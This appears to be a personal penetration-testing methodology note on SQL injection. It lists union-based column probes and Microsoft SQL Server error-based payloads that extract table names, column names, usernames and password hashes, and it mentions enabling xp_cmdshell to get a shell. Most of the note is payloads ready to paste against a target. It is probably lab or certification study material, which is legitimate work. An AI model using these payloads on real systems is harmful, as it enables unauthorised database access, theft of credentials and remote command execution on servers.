
<https://ansar0047.medium.com/blind-sql-injection-detection-and-exploitation-cheatsheet-17995a98fed1>
<https://vk9-sec.com/advanced-sql-injection-union-based/>

For auth bypass, see: [Fuzzing SQLI](270)

Find injection point. Could be something like this to break query  '

Then identify columns

Example to identify columns with simple injection point added:

'UNION ALL SELECT 1;--
'UNION ALL SELECT 1,2;--
'UNION ALL SELECT 1,2,3;--

Here a list you could take some from for fuzzing, but remember inject point
<https://github.com/payloadbox/sql-injection-payload-list#generic-union-select-payloads> 

Next you want more info no the target. Are you sysadmin? Which database versoin is running? What's inside the database? Anything valuable?
Can you enable xp_cmdshell? Can you do stack based queries? Can you execute stack based queries through xp_cmdshell? If so, then you can likely trigger the ps1 script to get shell.


MSSQL Injection:

<https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/MSSQL%20Injection.md>
<https://pentestmonkey.net/cheat-sheet/sql-injection/mssql-sql-injection-cheat-sheet>

Error-based SQLI: (The hole point with error based injection is that the SQL backend will error out some information about your query that's “wrong", and by using this to our adventage we can force this logic to spit out valuable information to us.)

', cast((SELECT @@version) as int)) --
', cast((SELECT db_name(1)) as int)) --

(Note: In this case I could only really enumarate one datapoint at a time, so I had to do something like this to make it work)
', cast((SELECT top 1 TABLE_NAME FROM information_schema.TABLES) as int)) --
', cast((SELECT top 1 TABLE_NAME FROM master.information_schema.TABLES) as int)) --
', cast((SELECT top 1 username FROM users) as int)) --
', cast((SELECT top 1 username FROM users where username not in('eric')) as int)) --
', cast((SELECT top 1 TABLE_NAME FROM information_schema.TABLES) as int)) --

(Note: You can do it like this too. I might prefer this variation of syntax actually.)
1',CONVERT(INT,(SELECT  top 1  TABLE_NAME FROM archive.information_schema.TABLES )))--
1',CONVERT(INT,(SELECT  top 1  COLUMN_NAME FROM archive.information_schema.COLUMNS WHERE TABLE_NAME='pmanager')))--
1',CONVERT(INT,(SELECT  top 1  TABLE_NAME FROM archive.information_schema.TABLES WHERE TABLE_NAME NOT IN ('pmanager'))))--
1',CONVERT(INT,(SELECT DISTINCT top 1 COLUMN_NAME FROM archive.information_schema.COLUMNS  WHERE TABLE_NAME='pmanager' AND column_name NOT IN ('alogin', 'id'))))
1',CONVERT(INT,(SELECT top 1 psw FROM archive..pmanager)))--

 1',CONVERT(INT,(SELECT top 1 psw FROM archive..pmanager where psw NOT IN ('7de6b6f0afadd89c3ed558da43930181'))))--
 
  1',CONVERT(INT,(SELECT top 1 psw FROM archive..pmanager where psw NOT IN ('7de6b6f0afadd89c3ed558da43930181', '5b413fe170836079622f4131fe6efa2d'))))--
  
  etc etc... Again, we could only get one datapoint at a time, so doing it this way works.
  
![unnamed_c4dec9d5c97649e18c1d828f94a4cbfb](docs/Attachments/Methodology/1.%20Enumeration/0.%20Initial%20Recon/4.%20Common%20Web%20Attack%20Techniques/SQLI/SQLI/{{notename}}-202605011506.png)
![unnamed_20b08c06d51e407f8484062c69e9b5f7](docs/Attachments/Methodology/1.%20Enumeration/0.%20Initial%20Recon/4.%20Common%20Web%20Attack%20Techniques/SQLI/SQLI/{{notename}}-202605011506-1.png)
![unnamed_ef4feaf5f95444719cc1570f4aee2cba](docs/Attachments/Methodology/1.%20Enumeration/0.%20Initial%20Recon/4.%20Common%20Web%20Attack%20Techniques/SQLI/SQLI/{{notename}}-202605011506-2.png)
